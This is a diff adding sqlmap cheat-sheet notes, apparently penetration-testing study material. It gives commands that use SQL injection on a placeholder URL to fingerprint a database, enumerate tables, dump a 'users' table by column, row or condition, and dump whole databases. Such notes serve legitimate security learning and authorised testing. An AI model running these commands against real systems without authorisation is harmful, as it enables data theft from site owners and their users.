@@ -35,3 +35,39 @@ In case of a MySQL DBMS:
 - Current database name (switch --current-db)
 - Checking if the curent user has DBA (administrator) rights (switch --is-dba)
 
+```shell-session
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+```
+
+## Table Enumeration
+```shell-session
+sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+```
+
+## Dump Table
+```shell-session
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+```
+- '-T' is for table name
+- '--dump-format' to specify HTML or SQLite
+
+## Table/Row Enumeration
+```shell-session
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+```
+- '-C' are the column names
+```shell-session
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
+```
+- '--start' and '--stop' print certain rows
+
+## Conditional Enumeration
+```shell-session
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+```
+- WHERE condition
+
+## Full DB Enumeration
+- '--dump'
+- '--dump-all'
+- '--exclude-sysdbs'
